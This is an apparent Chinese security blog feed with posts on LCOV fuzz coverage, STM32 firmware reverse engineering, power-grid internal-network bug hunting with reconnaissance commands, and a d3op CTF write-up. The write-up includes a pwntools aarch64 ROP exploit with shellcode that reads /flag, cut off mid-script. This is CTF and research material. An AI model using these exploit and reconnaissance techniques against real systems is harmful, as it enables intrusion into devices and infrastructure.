    <link href="/2023/08/22/%E3%80%90fuzz%20trick%E3%80%91%E5%88%A9%E7%94%A8LCOV%E6%B5%8B%E9%87%8F%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
    <url>/2023/08/22/%E3%80%90fuzz%20trick%E3%80%91%E5%88%A9%E7%94%A8LCOV%E6%B5%8B%E9%87%8F%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文样例为LibTIFF version 4.0.4，以CVE-2016-9297漏洞举例 </p></blockquote><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>直接使用<code>apt</code>安装包即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install lcov<br></code></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>整体流程大致如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> ./tiff-4.0.4/<br>lcov --zerocounters --directory ./<br>lcov --capture --initial --directory ./ --output-file app.info<br>../install/bin/tiffinfo -D -j -c -r -s -w ../out/default/crashes/id:000000,sig:06,src:000000,time:11605,execs:6660,op:havoc,rep:4<br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><p>每个部分含义如下：</p><ul><li><code>lcov --zerocounters --directory ./</code>，用于重置计数器</li><li><code>lcov --capture --initial --directory ./ --output-file app.info</code>，创建一个”baseline”覆盖率数据文件，其中包含每个检测线的零覆盖率</li><li><code>../install/bin/tiffinfo -D -j -c -r -s -w ../out/default/crashes/id:000000,sig:06,src:000000,time:11605,execs:6660,op:havoc,rep:4</code>，运行要分析的程序和输入，或是fuzz出的crash样本，这一步可以多次运行不同的输入用于测量覆盖率</li><li><code>lcov --no-checksum --directory ./ --capture --output-file app2.info</code>，将上一步出现的覆盖状态保存在<strong>app2.info</strong></li></ul><p>最后，我们需要生成一个html文件方便我们查看覆盖率情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info<br></code></pre></td></tr></table></figure><p>如果正常的话，我们就可以打开<code>./html-coverage/index.html</code>，查看覆盖率状况</p><p><img src="/img/article/lcov/Image2_2.png" alt="coverage"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT】嵌入式设备固件分析</title>
    <link href="/2023/07/12/%E3%80%90IOT%E3%80%91%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2023/07/12/%E3%80%90IOT%E3%80%91%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>嵌入式设备固件一般可以分为两类：</p><ul><li>有文件系统（如路由器固件这种）</li><li>无文件系统（如STM32这种嵌入式设备固件，程序直接存放在flash中）</li></ul><p>针对第一类固件，分析起来比较简单，直接binwalk分离。然后去逆向对应的服务对应的二进制程序即可，也不需要考虑程序的加载地址。</p><p>而对于第二类固件，往往就会比较复杂，需要分析程序的加载地址，也需要考虑外设的地址映射。</p><blockquote><p>本文将从SCTF2020的题目Password Lock入手，分析STM32固件作为入门</p></blockquote><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>这是一个STM32F103C8T6 MCU密码锁, 它具有4个按键，分别为1, 2, 3, 4. 分别对应GPIO_PA1, GPIO_PA2, GPIO_PA3, GPIO_PA4.</p><ol><li>flag1格式为SCTF{正确的按键密码}</li><li>输入正确的密码, 它将通过串口(PA9–TX)发送flag2</li></ol><h2 id="确定固件加载地址"><a href="#确定固件加载地址" class="headerlink" title="确定固件加载地址"></a>确定固件加载地址</h2><p>这里有两个方法可以确定，一个是直接分析Intel Hex文件，另一个是去看芯片对应的内存映射图（可以通过<a href="https://www.alldatasheet.com/">ALLDATASHEET.COM</a>去搜索芯片信息）</p><h3 id="分析Intel-Hex文件"><a href="#分析Intel-Hex文件" class="headerlink" title="分析Intel Hex文件"></a>分析Intel Hex文件</h3><blockquote><p>本模块可以参考<a href="https://en.wikipedia.org/wiki/Intel_HEX">Intel HEX - Wikipedia — 英特尔十六进制 - 维基百科</a></p></blockquote><p>Intel Hex可以直接用记事本打开，我们以本题的第一行为例分析其数据格式</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">:020000040800F2<br></code></pre></td></tr></table></figure><ul><li>第一个符合<code>:</code>代表没一行数据的起始，为start code</li><li>之后的第一个byte<code>02</code>为Byte Count，代表data的长度</li><li>紧接着的两个字节<code>0000</code>为Address</li><li>接下来的一个字节<code>04</code>为record type，总共有6个类型（00数据，01文件结尾，02拓展分段地址，03开始段地址，04拓展线性地址，05起始线性地址）</li><li>接下来直到最后一个字节之前为数据data，</li><li>最后一个字节F2为校验和，校验和为所有字节之和的补码</li></ul><p>这里主要record type这个字段需要注意</p><table><thead><tr><th align="center">hex</th><th align="center">type</th><th align="center">Description</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">数据</td><td align="center">由byte count字段决定data字段的数据长度</td><td align="center">:0B0010006164647265737320676170A7</td></tr><tr><td align="center">01</td><td align="center">文件结尾</td><td align="center">一般为hex文件最后一行，代表文件结束</td><td align="center">:00000001FF</td></tr><tr><td align="center">02</td><td align="center">扩展分段地址</td><td align="center">byte count固定为02，起始地址为data段值乘以16</td><td align="center">:020000021200EA</td></tr><tr><td align="center">03</td><td align="center">开始段地址</td><td align="center">对于8086处理器指定起始执行地址</td><td align="center">:0400000300003800C1</td></tr><tr><td align="center">04</td><td align="center">扩展线性地址</td><td align="center">data段代表起始地址的高16位</td><td align="center">:020000040800F2</td></tr><tr><td align="center">05</td><td align="center">起始线性地址</td><td align="center">data表示大端的32位地址</td><td align="center">:04000005000000CD2A</td></tr></tbody></table><p>针对本题的起始数据为<code>:020000040800F2</code>，可以很明显的看到类型为04，则可以计算出对应地址为<strong>0x08000000</strong></p><h3 id="查看内存映射"><a href="#查看内存映射" class="headerlink" title="查看内存映射"></a>查看内存映射</h3><p>在上面的datasheet网站中可以搜索到：<a href="https://pdf1.alldatasheet.com/datasheet-pdf/view/201596/STMICROELECTRONICS/STM32F103C8T6.html">STM32F103C8T6 Datasheet</a>本题对应的datasheet，查看memory mapping章节可以得到下图。</p><p><img src="/img/article/stm32/image-20230711195206201.png" alt="memory maping"></p><p>从图中也可以比较直观的找到flash段的地址在0x08000000，此外还可以看到一些外设的地址段PERIPHERALS，这也是后面分析时要考虑的。</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>将hex文件拖入IDA后，首先设置<strong>process type</strong>为小端，然后设置架构为<strong>arm-v7</strong>（这个可以在手册中查到），如图：</p><p><img src="/img/article/stm32/image-20230712092047827.png" alt="set type"></p><p>跟踪流程可以跟到<code>sub_8000428</code>，基本可以确定其就是主函数<code>main</code>，红色区域地址是因为IDA没有加载这个地址的段。</p><p><img src="/img/article/stm32/image-20230712095333876.png" alt="preview"></p><p>对照内存映射图，我们可以知道这些0x40000000的地址属于外设的地址映射，也就是对应了不同的针脚。可以在Edit -&gt; Segment -&gt; create segment，手动添加sram和peripherals段即可，再次F5即可看到区域变为正常黄色。</p><p>接下来就需要手动查阅手册，为每个地址改变量名为设备名称，方便后续分析，在我看来这也是最耗时最麻烦的一步。但其如果使用Ghidra和SVD-loader插件会快很多，可以直接自动识别更改，但我在尝试的时候没有成功，不知什么原因，悲 :(</p><p>改完差不多就是这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init((<span class="hljs-type">int</span>)&amp;loc_8000428 + <span class="hljs-number">1</span>, (<span class="hljs-type">int</span>)argv);<br>  RCC_APB2ENR = <span class="hljs-number">0x4005</span>;<br>  RCC_AHBENR = <span class="hljs-number">1</span>;<br>  PA_CRL = <span class="hljs-number">0x44488884</span>;<br>  PA_CRH = <span class="hljs-number">0x444444B4</span>;<br>  PA_ODR = <span class="hljs-number">0x1E</span>;<br>  EXTI_IMR = <span class="hljs-number">0x1E</span>;<br>  EXTI_FTSR = <span class="hljs-number">0x1E</span>;<br>  AFIO_EXTICR2 = <span class="hljs-number">0</span>;<br>  AFIO_EXTICR3 = <span class="hljs-number">0</span>;<br>  unkown(<span class="hljs-number">7</span>);<br>  unkown(<span class="hljs-number">8</span>);<br>  unkown(<span class="hljs-number">9</span>);<br>  unkown(<span class="hljs-number">10</span>);<br>  RCC_APB2RSTR |= <span class="hljs-number">0x4000</span>u;<br>  RCC_APB2RSTR &amp;= <span class="hljs-number">0xFFFFBFFF</span>;<br>  USART1_BRR = <span class="hljs-number">0x271</span>;<br>  USART1_CR1 = <span class="hljs-number">0x2008</span>;<br>  USART1_SEND(<span class="hljs-string">&#x27;S&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;C&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;T&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;F&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>  USART1_CR3 = <span class="hljs-number">0x80</span>;<br>  DMA_CMAR4 = <span class="hljs-number">0x20000000</span>;<br>  DMA_CPAR4 = &amp;USART_DR;<br>  DMA_CNDTR4 = <span class="hljs-number">0x1E</span>;<br>  DMA_CCR4 = <span class="hljs-number">0x492</span>;<br>  unkown(<span class="hljs-number">14</span>);<br>  EXTI_SWIER |= <span class="hljs-number">2u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">0x10</span>u;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">0x10</span>u;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">4u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">0x10</span>u;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">2u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">8u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    ;<br>&#125;<br></code></pre></td></tr></table></figure><p>另外还要对中断向量表做处理，可以用如下IDA python脚本更改段为dword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x8000000</span>,<span class="hljs-number">0x80000eb</span>,<span class="hljs-number">1</span>):del_items(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x8000000</span>,<span class="hljs-number">0x80000eb</span>,<span class="hljs-number">4</span>):create_dword(i)<br></code></pre></td></tr></table></figure><p><img src="/img/article/stm32/image-20230712101949569.png" alt="vector"></p><p>图里可以很明显的看出存在一些函数，查阅手册可以找到其为中断处理的EXTI函数</p><h2 id="函数逻辑分析"><a href="#函数逻辑分析" class="headerlink" title="函数逻辑分析"></a>函数逻辑分析</h2><p>这条也没什么捷径可走，需要一边查手册一边看mian函数内的每一步赋值和函数的意义，基本经过这个流程可以搞清楚GPIO、EXTI、USART这些作用之类的</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>某市电网漏洞挖掘小记</title>
    <link href="/2023/07/10/%E6%9F%90%E5%B8%82%E7%94%B5%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/"/>
    <url>/2023/07/10/%E6%9F%90%E5%B8%82%E7%94%B5%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>由于电网设施保护非常严格，整个网络拓扑也异常复杂，说实话前两天一直在梳理整个体系架构（后来发现完全没必要）。整整4天，找到两个栈溢出，但都没法利用，只好按DOS交了。据我了解，从外网进入内部网络的可能性几乎没有，实际漏挖也是需要线下网线接入交换机。</p><blockquote><p> 说实话我也不知道这种内网漏洞的意义是什么，感觉像是审潜在代码BUG</p></blockquote><h2 id="接入设备"><a href="#接入设备" class="headerlink" title="接入设备"></a>接入设备</h2><p>首先就是接入交换机然后ssh上服务器，不过接入的时候是不能开启wifi，不能连接其他网络，不然监管系统会一直报警👮👮👮</p><p>ssh上去之后的第一件事就是看看内网的所有机器以及对应IP，以此确定从哪台机子的服务入手进行漏挖。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> /etc/hosts <span class="hljs-comment">#查看不同设备及对应IP</span><br></code></pre></td></tr></table></figure><p>之后就是查看该设备有哪些服务是开启的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -tulnp <span class="hljs-comment">#查看所有的TCP/UDP进程</span><br><span class="hljs-comment"># -t 为TCP -u为UDP</span><br><br><span class="hljs-comment">#下面两个指令都是用来寻找程序路径</span><br>ps - ef <span class="hljs-comment">#查看进程</span><br>whereis/which &lt;name&gt; <br></code></pre></td></tr></table></figure><p>找到对应可能存在漏洞的程序后，就可以<code>scp</code>拷贝到本机，然后IDA逆向分析了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">scp name@127.0.0.1:&lt;remote path&gt; &lt;<span class="hljs-built_in">local</span> path&gt;<br></code></pre></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><blockquote><p>虽然新系统从安全角度考虑不会将源码交给我们。但我目前接触到的系统似乎未对程序进行任何混淆、加壳或者阻碍反汇编的行为，甚至变量的符号表都是存在的。逆向起来非常舒适，跟直接审源码区别也不大。</p></blockquote><p>由于这些服务大多都是标准的C&#x2F;S结构，那么分析的关键入口点就是找到<code>recv</code>, <code>recvfrom</code>, <code>read</code>这样的接收数据的函数。当然他们的接收函数往往都是自行封装后的，直接搜索函数不一定会有结果。</p><p>找到接收函数之后，就是分析报文结构了。由于这些程序的通信都有一套符合自身标准的报文格式，熟悉对应的格式，可以更快速的理解后续的报文处理part。</p><p>基本所有的报文结构都可以用<strong>header + body</strong>概况，关键便是理解<strong>header</strong>中各个字段的含义。这里的报文分析可以从两个角度进行处理：</p><ul><li>由于已经连入内网，可以直接用tcpdump抓取报文配合wireshark进行分析</li><li>可以直接使用IDA PRO从处理流程的角度逆向分析</li></ul><p>上述两者相互配合效果会好很多</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">tcpdump -i any -n tcp port 9999 -w /tmp/123.<span class="hljs-built_in">cap</span> <span class="hljs-comment">#抓取TCP包</span><br>tcpdump -i any -n udp port 9999 -w /tmp/123.<span class="hljs-built_in">cap</span> <span class="hljs-comment">#抓取UDP包</span><br></code></pre></td></tr></table></figure><p>用上述命令保存抓到的包后，scp到本机用wireshark分析即可</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在挖洞的时候我注意到，几乎所有的设备都是采用国产的linux某系统。不太清楚是该系统一直未更新的缘故还是gcc未更新的缘故，设备上所有的服务都没有<strong>canary</strong>和<strong>PIE</strong>防护。这在很大程度上降低了漏洞利用的难度，使得基于二进制漏洞的RCE更容易实现。</p><p><img src="/img/article/dig1/image-20230710154558220.png" alt="image-20230710154558220"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【WP】AntCTFxD3^CTF d3op</title>
    <link href="/2023/05/16/%E3%80%90kernel%E3%80%91AntCTFxD3%5ECTF%20d3op%20WP/"/>
    <url>/2023/05/16/%E3%80%90kernel%E3%80%91AntCTFxD3%5ECTF%20d3op%20WP/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文采取根据官方wp的方式进行复现，需要官方WP的pdf文件也可以在评论区留言（侵删）</p></blockquote><h2 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h2><p>首先解压文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> rootfs<br><span class="hljs-built_in">cd</span> rootfs<br>unsquashfs ../unsquashfs ../squashfs-root.img  <br></code></pre></td></tr></table></figure><p>在<code>etc/os-release</code>中我们能看到版本信息</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;OpenWrt&quot;</span><br><span class="hljs-attr">VERSION</span>=<span class="hljs-string">&quot;22.03.3&quot;</span><br><span class="hljs-attr">ID</span>=<span class="hljs-string">&quot;openwrt&quot;</span><br><span class="hljs-attr">ID_LIKE</span>=<span class="hljs-string">&quot;lede openwrt&quot;</span><br><span class="hljs-attr">PRETTY_NAME</span>=<span class="hljs-string">&quot;OpenWrt 22.03.3&quot;</span><br><span class="hljs-attr">VERSION_ID</span>=<span class="hljs-string">&quot;22.03.3&quot;</span><br><span class="hljs-attr">HOME_URL</span>=<span class="hljs-string">&quot;https://openwrt.org/&quot;</span><br><span class="hljs-attr">BUG_URL</span>=<span class="hljs-string">&quot;https://bugs.openwrt.org/&quot;</span><br><span class="hljs-attr">SUPPORT_URL</span>=<span class="hljs-string">&quot;https://forum.openwrt.org/&quot;</span><br><span class="hljs-attr">BUILD_ID</span>=<span class="hljs-string">&quot;r20028-43d71ad93e&quot;</span><br><span class="hljs-attr">OPENWRT_BOARD</span>=<span class="hljs-string">&quot;armvirt/64&quot;</span><br><span class="hljs-attr">OPENWRT_ARCH</span>=<span class="hljs-string">&quot;aarch64_cortex-a53&quot;</span><br><span class="hljs-attr">OPENWRT_TAINTS</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_MANUFACTURER</span>=<span class="hljs-string">&quot;OpenWrt&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_MANUFACTURER_URL</span>=<span class="hljs-string">&quot;https://openwrt.org/&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_PRODUCT</span>=<span class="hljs-string">&quot;Generic&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_REVISION</span>=<span class="hljs-string">&quot;v0&quot;</span><br><span class="hljs-attr">OPENWRT_RELEASE</span>=<span class="hljs-string">&quot;OpenWrt 22.03.3 r20028-43d71ad93e&quot;</span><br></code></pre></td></tr></table></figure><p>根据题目提示<code>May be you need to do a diff with the rootfs in attachment.</code>，我们可以利用其中的关键词，从openwrt中搜索到官方的文件系统，解压后进行diff比较</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> rootfs<br>unsquashfs ../openwrt-22.03.3-armvirt-64-rootfs-squashfs.img<br>diff -r squashfs-root squashfs-root-d3op <br></code></pre></td></tr></table></figure><p>可得如下图结果</p><p><img src="/img/article/d3op/image-20230507175322524.png" alt="image-20230507175322524"></p><p>可以看到题目的文件系统多了对二进制文件base64，以及其对应的ubus的rpc接口，且这个接口可以未经身份验证访问。</p><blockquote><p>我们可以通过本机的127.0.0.1:9999查看路由器的登录入口，典型IOT</p></blockquote><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>程序是去符号表的，不过简单逆向就能看出其逻辑，主函数如下</p><p><img src="/img/article/d3op/image-20230512143723652.png" alt="image-20230512143723652"></p><p>可根据argv的参数决定输出，比如参数为<code>list</code>即可输出格式，<code>call</code>会调用<code>decode</code>或者<code>encode</code>函数，跟进函数<code>sub_4064f0</code>可以看到如下比较明显的框架：</p><p><img src="/img/article/d3op/image-20230512144108981.png" alt="image-20230512144108981"></p><p>漏洞点在<code>decode</code>函数当中，观察如下两个部分</p><p><img src="/img/article/d3op/image-20230512144314406.png" alt="image-20230512144314406"></p><p><img src="/img/article/d3op/image-20230512144326907.png" alt="image-20230512144326907"></p><p>可以看到<code>decode</code>函数通过计算出<code>output_len</code>，并以此作为长度，先向<code>v16</code>中赋值解码好的数据，然后整个拷贝进入<code>a2</code>当中。</p><p>但在<code>main</code>函数中，我们的读入是4095，而这里并没有检测v16的长度，导致v16作为一个中间量出现溢出。</p><p><img src="/img/article/d3op/image-20230512144619845.png" alt="image-20230512144619845"></p><p>此时看一眼<code>base64</code>二进制程序的保护，发现只有NX，那么就可以直接溢出构造ROP了</p><p><img src="/img/article/d3op/image-20230512144804176.png" alt="image-20230512144804176"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>基本思路如下：</p><ul><li>利用溢出构造arm64架构下的ROP</li><li>转成base64后用访问对应api接口即可</li></ul><h3 id="构造ROP以及base64转换部分"><a href="#构造ROP以及base64转换部分" class="headerlink" title="构造ROP以及base64转换部分"></a>构造ROP以及base64转换部分</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;aarch64&quot;</span><br><span class="hljs-comment"># p = process([&quot;./base64&quot;, &quot;decode&quot;])</span><br><span class="hljs-comment"># elf = ELF(&quot;./elf&quot;)</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment"># 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span><br>set_x0 = <span class="hljs-number">0x00000000004494b8</span><br><span class="hljs-comment"># 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],</span><br><span class="hljs-comment">#0x30 ; ret</span><br>set_x1 = <span class="hljs-number">0x00000000004010ec</span><br><span class="hljs-comment"># call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)</span><br>call_mprotect = <span class="hljs-number">0x00000000004579A4</span><br>shellcode = shellcraft.aarch64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>)<br>shellcode += shellcraft.aarch64.linux.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x4a23a4</span>, <span class="hljs-number">0x100</span>)<br>shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    MOV X3, X0</span><br><span class="hljs-string">    LDR X1, =0x22</span><br><span class="hljs-string">    LDR X2, =0x4a23a3</span><br><span class="hljs-string">    STRB W1, [X3, X2]</span><br><span class="hljs-string">    LDR X1, =0x7d</span><br><span class="hljs-string">    LDR X2, =0x4a23a4</span><br><span class="hljs-string">    STRB W1, [X3, X2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.aarch64.linux.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x4a2398</span>, <span class="hljs-number">0x100</span>)<br>shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    LDR X0, =1</span><br><span class="hljs-string">    LDR X9, =0x422D60</span><br><span class="hljs-string">    BLR X9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shellcode,bits = <span class="hljs-number">64</span>)<br>payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-number">0x4A3000</span>)<br>payload += p64(<span class="hljs-number">0x4A2000</span>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += <span class="hljs-string">b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;</span><br>payload = payload.ljust(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char1</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char2</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char3</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char3</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char4</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char4</span><br>payload += <span class="hljs-string">b&quot;\x18\x06\x00\x00&quot;</span> <span class="hljs-comment"># input lenght</span><br>payload += <span class="hljs-string">b&quot;\x1d\x04\x00\x00&quot;</span> <span class="hljs-comment"># output idx</span><br>payload += <span class="hljs-string">b&quot;\x84\x05\x00\x00&quot;</span> <span class="hljs-comment"># input idx</span><br>payload += <span class="hljs-string">b&quot;\x92\x04\x00\x00&quot;</span> <span class="hljs-comment"># output length</span><br>payload += p64(<span class="hljs-number">0x4A2500</span>) <span class="hljs-comment"># x29</span><br>payload += p64(set_x0) <span class="hljs-comment"># x30</span><br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload += p64(<span class="hljs-number">0x4A2500</span>) <span 